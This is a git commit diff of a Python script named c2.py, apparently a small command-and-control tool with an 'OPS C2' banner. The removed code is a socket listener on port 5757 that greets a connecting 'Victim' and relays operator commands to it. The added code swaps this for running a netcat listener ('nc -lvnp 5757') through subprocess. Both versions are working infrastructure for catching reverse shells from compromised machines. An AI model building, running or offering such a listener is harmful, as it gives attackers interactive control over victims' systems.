9e745fd476db7507e8a2002414fec8cf7882ffcb
Ivan Fonseca <107064877+TatoSec@users.noreply.github.com>
2023-10-24 08:31:15 -0400

    Updated c2.py functionality

--- c2.py
+++ c2.py
@@ -1,4 +1,4 @@
-import subprocess, socket, threading, sys
+import subprocess
 
 # ANSI escape codes for text formatting
 BOLD = "\033[1m"
@@ -9,48 +9,26 @@ GREEN = "\033[32m"
 # Define your ASCII art banner
 banner = r"""
 
- ██████╗ ██████╗ ███████╗     ██████╗██████╗ 
+ ██████╗ ██████╗ ███████╗     ██████╗██████╗
 ██╔═══██╗██╔══██╗██╔════╝    ██╔════╝╚════██╗
 ██║   ██║██████╔╝███████╗    ██║      █████╔╝
-██║   ██║██╔═══╝ ╚════██║    ██║     ██╔═══╝ 
+██║   ██║██╔═══╝ ╚════██║    ██║     ██╔═══╝
 ╚██████╔╝██║     ███████║    ╚██████╗███████╗
  ╚═════╝ ╚═╝     ╚══════╝     ╚═════╝╚══════╝
                                         v1.0
 """
+def nc_listener():
+   # Define the command to run
+   command = ["nc", "-lvnp", "5757"]
 
-# Function to handle data from the client
-def handle_client(client_socket, client_addr):
-    print(f"{BOLD}{GREEN}[+] Victim Connected on{RESET} {client_addr[0]}:{client_addr[1]}")
-    while True:
-        # Receive data from the client
-        data = client_socket.recv(1024).decode('utf-8')
-        if not data:
-            break
+   # Use the subprocess module to run the command
+   try:
+       subprocess.run(command, check=True)
+   except subprocess.CalledProcessError as e:
+       print(f"Error: {e}")
 
-        # Display received data
-        print(data, end='')
 
-        # Read user input and send it to the client
-        user_input = input()
-        client_socket.send(user_input.encode('utf-8') + b'\n')
+print(banner)
+print("Listening")
+nc_listener()
 
-    client_socket.close()
-
-# Main function
-def main():
-    print(banner)
-
-    # Create a socket to listen for incoming connections
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(('0.0.0.0', 5757))
-    server.listen(1)  # Listen for one connection
-
-    print(f"{BOLD}{BLUE}[*] Waiting for a connection...")
-    client, addr = server.accept()
-
-    # Start a thread to handle communication with the client
-    client_handler = threading.Thread(target=handle_client, args=(client, addr))
-    client_handler.start()
-
-if __name__ == "__main__":
-    main()
